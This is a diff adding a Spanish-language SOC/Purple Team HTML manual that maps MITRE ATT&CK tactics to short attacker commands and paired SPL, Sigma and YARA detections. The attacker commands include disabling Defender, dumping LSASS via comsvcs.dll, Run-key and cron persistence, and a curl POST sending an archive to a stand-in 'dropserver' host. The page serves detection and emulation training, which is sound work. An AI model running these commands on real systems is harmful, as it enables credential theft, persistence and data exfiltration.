@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Amenazas Avanzadas / TTPs (MITRE ATT&CK) — Manual SOC</title>
+<style>
+:root{ --bg:#0b1020; --panel:#121a33; --muted:#98a2b3; --text:#e6e8ef; --chip:#243056; --border:#1d2747; --card:#0f162b; }
+html{scroll-behavior:smooth}
+*{box-sizing:border-box}
+body{margin:0;background:linear-gradient(180deg,#0a0f21,#0b1126);color:var(--text);
+  font:14px/1.6 system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,"Helvetica Neue",Arial;}
+header{position:sticky;top:0;z-index:100;background:rgba(11,17,38,.85);
+  border-bottom:1px solid var(--border);backdrop-filter:saturate(180%) blur(10px)}
+.wrap{max-width:1100px;margin:auto;padding:16px}
+h1{margin:8px 0 4px;font-size:22px}
+.subtitle{margin:0 0 12px;color:var(--muted)}
+.grid{display:grid;grid-template-columns:260px 1fr;gap:16px}
+@media(max-width:900px){.grid{grid-template-columns:1fr}nav{position:static;max-height:none}}
+nav{position:sticky;top:86px;align-self:start;background:var(--panel);border:1px solid var(--border);
+  border-radius:14px;padding:8px;max-height:calc(100vh - 110px);overflow:auto}
+.cat{display:block;padding:10px 12px;border-radius:10px;color:#cdd3ea;text-decoration:none;border:1px solid transparent}
+.cat:hover{background:var(--chip);border-color:#2a3864}
+main{display:grid;gap:16px}
+section{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:12px}
+section h2{margin:6px 6px 8px;font-size:17px;display:flex;justify-content:space-between;align-items:center}
+.label{font-size:12px;color:#a0aec0;border:1px solid #2a3864;background:#0f162b;padding:3px 8px;border-radius:8px;white-space:nowrap}
+.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:10px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:10px;display:flex;flex-direction:column;gap:6px}
+.cmd{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;background:#0e1a3a;border:1px solid #223464;border-radius:8px;padding:8px;color:#e6eeff;white-space:pre-wrap}
+.desc{color:#a0aec0;font-size:13px}
+.btn{align-self:flex-start;border:1px solid var(--border);background:var(--chip);color:#cdd8ff;padding:6px 10px;border-radius:8px;cursor:pointer;font-size:13px}
+.btn:hover{border-color:#32406f}
+.searchbar{margin-top:8px;margin-bottom:12px}
+input[type=search]{width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:#0c1430;color:#e6e8ef}
+#topBtn{position:fixed;bottom:25px;right:25px;background:#243056;border:1px solid #32406f;color:#cdd8ff;
+  border-radius:50%;width:45px;height:45px;font-size:22px;cursor:pointer;display:none;align-items:center;justify-content:center;transition:0.3s}
+#topBtn:hover{background:#32406f}
+footer{color:var(--muted);text-align:center;padding:16px}
+.badge{font-size:12px;padding:2px 6px;border:1px solid #32406f;border-radius:6px;background:#0f1a3a;color:#a9b4d8}
+</style>
+</head>
+<body>
+<header><div class="wrap">
+  <h1>Amenazas Avanzadas / TTPs (MITRE ATT&CK)</h1>
+  <p class="subtitle">Emulación de adversarios, simulaciones y detecciones mapeadas a tácticas y técnicas ATT&CK para Red/Purple Team y SOC.</p>
+  <div class="searchbar"><input id="q" type="search" placeholder="Buscar técnica, ID (T1059), comando o detección..."></div>
+</div></header>
+
+<div class="wrap grid">
+  <nav>
+    <a class="cat" href="#overview">Overview MITRE ATT&CK</a>
+    <a class="cat" href="#emulacion">Emulación / Simulación (Atomic / Caldera)</a>
+    <a class="cat" href="#execution">Ejecución (TA0002)</a>
+    <a class="cat" href="#persistence">Persistencia (TA0003)</a>
+    <a class="cat" href="#defense_evasion">Evasión de Defensas (TA0005)</a>
+    <a class="cat" href="#cred_access">Acceso a Credenciales (TA0006)</a>
+    <a class="cat" href="#discovery">Descubrimiento (TA0007)</a>
+    <a class="cat" href="#lateral">Movimiento Lateral (TA0008)</a>
+    <a class="cat" href="#c2">Comando y Control (TA0011)</a>
+    <a class="cat" href="#exfil">Exfiltración (TA0010)</a>
+    <a class="cat" href="#impact">Impacto (TA0040)</a>
+    <a class="cat" href="#detecciones">Detecciones SPL/Sigma/YARA</a>
+  </nav>
+
+  <main id="content">
+    <!-- Overview -->
+    <section id="overview">
+      <h2>Overview MITRE ATT&amp;CK <span class="label">Tácticas & Técnicas</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># Descargar matriz y referencias (offline)
+mkdir -p mitre && curl -sL https://attack.mitre.org/docs/enterprise-attack-v13.1/enterprise-attack-v13.1.xlsx -o mitre/enterprise.xlsx || true</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Matriz Enterprise ATT&amp;CK (versión de ejemplo).</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># Plantilla de mapeo
+echo 'ID,Tactic,Technique,Query,Log-Source' > mitre_map.csv</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">CSV para mapear tus detecciones a ATT&amp;CK.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Emulación -->
+    <section id="emulacion">
+      <h2>Emulación / Simulación (Atomic Red Team / Caldera) <span class="label">Purple Team</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># Atomic Red Team (Linux/macOS) - ejecutar prueba T1059 (Command & Scripting Interpreter)
+git clone https://github.com/redcanaryco/atomic-red-team.git
+cd atomic-red-team/atomics/T1059
+bash ./T1059.sh</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Simula técnicas de ejecución de scripts.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># Caldera (MITRE) - ejecutar servidor
+git clone https://github.com/mitre/caldera.git && cd caldera
+pip3 install -r requirements.txt
+python3 server.py --insecure --log DEBUG</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Plataforma de emulación de adversarios para ejercicios Purple Team.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># Invoke-Atomic (Windows PowerShell)
+Install-Module -Name Invoke-AtomicRedTeam -Force
+Invoke-AtomicTest T1059 -ShowDetailsBrief | Format-Table
+Invoke-AtomicTest T1059 -ExecutionCredential (Get-Credential) -Cleanup</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Lanza pruebas ATT&amp;CK en hosts Windows de forma controlada.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Execution -->
+    <section id="execution">
+      <h2>Ejecución — TA0002 <span class="badge">Ejemplos: T1059, T1204</span> <span class="label">Comandos & SPL</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># PowerShell con Base64 (T1059.001)
+powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoACcAVwByAGkAdABlACcAKQA=</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Ejecución ofuscada; detectar por patrón -Enc/Base64.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># SPL: detectar PS ofuscado
+index=sysmon (Image="*powershell.exe*" AND CommandLine="*-enc*" ) | stats count by User, Host, CommandLine</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Detección para T1059 en Windows.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># Linux: bash desde variable/environment (T1059)
+bash -c "${PAYLOAD}"</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Técnica genérica de ejecución indirecta en Linux.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Persistence -->
+    <section id="persistence">
+      <h2>Persistencia — TA0003 <span class="badge">Ejemplos: T1547, T1053</span> <span class="label">Comandos & SPL</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># Windows Run Keys (T1547.001)
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\\Users\\Public\\updater.exe"</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Clave Run para persistir tras logon.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># SPL: creación Run Keys
+index=wineventlog EventCode=4657 (Registry_Key_Path="*\Run*") | stats count by User, Registry_Key_Path, Computer</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Audita cambios en Run/RunOnce.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># Linux: cron persistente (T1053)
+(crontab -l; echo "@reboot /usr/local/bin/agent.sh") | crontab -</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Tarea al iniciar el sistema.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Defense Evasion -->
+    <section id="defense_evasion">
+      <h2>Evasión de Defensas — TA0005 <span class="badge">Ejemplos: T1562, T1027</span> <span class="label">Comandos & SPL</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># Deshabilitar Defender (T1562)
+powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Intento de neutralizar AV/EDR.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># SPL: eventos Defender off
+index=wineventlog source="Microsoft-Windows-Windows Defender*" ("disable" OR "tamper") | stats count by Computer, EventCode, Message</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Detección de T1562 en endpoints Windows.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># Ofuscación binaria (T1027) — ejemplo compresión
+upx -9 payload.exe</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Empaquetado para evadir firmas.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Credential Access -->
+    <section id="cred_access">
+      <h2>Acceso a Credenciales — TA0006 <span class="badge">Ejemplos: T1003, T1552</span> <span class="label">Comandos & SPL</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># LSASS dump (T1003.001) — ejemplo comsvcs.dll
+rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump  (pid) C:\\temp\\lsass.dmp full</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Extracción de credenciales de memoria.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># SPL: acceso a lsass
+index=sysmon (Image="*rundll32.exe*" AND CommandLine="*comsvcs.dll*MiniDump*") | stats count by User, Host, CommandLine</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Detección de intento de volcado de LSASS.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># Linux: buscar secretos en archivos (T1552)
+grep -R --line-number -i 'aws_secret|api_key|password' /var/www/ 2>/dev/null</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Búsqueda de secretos expuestos en servidores.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Discovery -->
+    <section id="discovery">
+      <h2>Descubrimiento — TA0007 <span class="badge">Ejemplos: T1087, T1018</span> <span class="label">Comandos & SPL</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># Enumerar usuarios (Windows) T1087
+net user /domain</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Recopila cuentas del dominio.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># Descubrimiento de red (Linux) T1018
+nmap -sn 10.0.0.0/24</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Ping scan para identificar hosts activos.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># SPL: ráfagas de escaneo
+index=network (sourcetype=nfdump OR sourcetype=zeek:conn) | bin _time span=1m | stats count by src,_time | where count>200</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Detecta actividad tipo escaneo en red.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Lateral Movement -->
+    <section id="lateral">
+      <h2>Movimiento Lateral — TA0008 <span class="badge">Ejemplos: T1021 (SMB/PS/SSH)</span> <span class="label">Comandos & SPL</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># Windows: WMI/WinRM (PowerShell Remoting)
+Enter-PSSession -ComputerName HOST -Credential (Get-Credential)</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Sesiones remotas para movimiento lateral.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># Linux: pivote con SSH y port forwarding
+ssh -N -L 8080:10.0.0.5:80 user@gateway</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Túneles para pivotear hacia servicios internos.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># SPL: inicios de sesión laterales inusuales
+index=wineventlog EventCode=4624 Logon_Type=3 | stats dc(Computer) as hosts by Account_Name | where hosts>5</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Cuentas que acceden a muchos hosts en poco tiempo.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- C2 -->
+    <section id="c2">
+      <h2>Comando y Control — TA0011 <span class="badge">Ejemplos: T1071 (Web/HTTP/S), T1090 (Proxy)</span> <span class="label">Comandos & SPL</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># Túnel HTTP CONNECT (posible C2)
+curl -x http://proxy:3128 https://example.com -I</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Uso de proxy como canal de C2.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># SPL: detectar CONNECT 200
+index=proxy method=CONNECT status=200 | stats count by dest, user | sort - count</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Indicador de tunelización saliente.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># DNS como C2 (consulta masiva de subdominios)
+dig -t A aaaaaaaaaaaaaaaa.domain.tld</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Tráfico DNS anómalo para DGA/C2.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Exfil -->
+    <section id="exfil">
+      <h2>Exfiltración — TA0010 <span class="badge">Ejemplos: T1041, T1567</span> <span class="label">Comandos & SPL</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># HTTP exfil (curl)
+tar -czf data.tar.gz datos/ && curl -X POST -F "file=@data.tar.gz" https://dropserver/upload</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Exfil de archivos vía HTTP POST.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># SPL: salida anómala por volumen
+index=proxy method=POST | stats sum(bytes) as out by src,user | where out>100000000</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Umbral de bytes para detectar exfil.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># Exfil a S3 (ejemplo)
+aws s3 cp data.tar.gz s3://bucket-seguro/ --sse AES256</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Movimiento de datos a almacenamiento externo.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Impact -->
+    <section id="impact">
+      <h2>Impacto — TA0040 <span class="badge">Ejemplos: T1486 (Ransomware)</span> <span class="label">Comandos & SPL</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># Cifrado masivo (simulación)
+openssl enc -aes-256-cbc -in file.txt -out file.txt.enc -k SUPERPASS</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Simula actividad tipo ransomware a pequeña escala.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># SPL: spikes de extensiones .enc/.locked
+index=endpoint (process="*openssl*" OR FileName="*.enc" OR FileName="*.locked") | timechart count</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Indicadores de cifrado masivo.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Detecciones -->
+    <section id="detecciones">
+      <h2>Detecciones SPL / Sigma / YARA <span class="label">Reglas & Artefactos</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="cmd"># Sigma (YAML) — Powershell con -enc (T1059)
+title: Suspicious PowerShell Encoded Command
+id: 5f8b3d2a-0001
+status: stable
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4688
+    NewProcessName|endswith: powershell.exe
+    CommandLine|contains: "-enc"
+  condition: selection
+level: high</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Regla Sigma portable a múltiples SIEMs.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># YARA — cadenas de C2 genéricas
+rule possible_c2_beacon {
+  meta: author="SOC" mitre="T1071"
+  strings:
+    $s1 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Beacon"
+    $s2 = "X-Session-Id: "
+  condition:
+    any of them
+}</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Ejemplo simple de YARA para binarios sospechosos.</div>
+        </div>
+        <div class="card">
+          <div class="cmd"># SPL — catálogo por técnica
+| inputlookup mitre_techniques.csv | stats count by technique, tactic</div>
+          <button class="btn">Copiar</button>
+          <div class="desc">Inventario de cobertura de detecciones.</div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<footer>Manual SOC — Amenazas Avanzadas / TTPs (MITRE ATT&CK)</footer>
+<button id="topBtn" title="Volver arriba">⬆</button>
+
+<script>
+// Copiar: concatena todos los bloques .cmd de la tarjeta (si hay varios)
+document.querySelectorAll('.card .btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const cmds = Array.from(btn.parentElement.querySelectorAll('.cmd')).map(d=>d.innerText).join('\n');
+    navigator.clipboard.writeText(cmds).then(() => {
+      const prev = btn.textContent; btn.textContent = 'Copiado';
+      setTimeout(() => btn.textContent = prev, 1200);
+    });
+  });
+});
+// Búsqueda
+document.getElementById('q').addEventListener('input', e => {
+  const term = e.target.value.toLowerCase();
+  document.querySelectorAll('main section').forEach(sec => {
+    let any=false;
+    sec.querySelectorAll('.card').forEach(card => {
+      const hit = card.textContent.toLowerCase().includes(term);
+      card.style.display = hit ? 'flex' : 'none';
+      if (hit) any = true;
+    });
+    sec.style.display = (any || !term) ? 'block' : 'none';
+  });
+});
+// Botón arriba
+const topBtn = document.getElementById('topBtn');
+window.addEventListener('scroll', () => {
+  topBtn.style.display = (document.documentElement.scrollTop > 400) ? 'flex' : 'none';
+});
+topBtn.addEventListener('click', () => {
+  window.scrollTo({top: 0, behavior: 'smooth'});
+});
+</script>
+</body>
+</html>
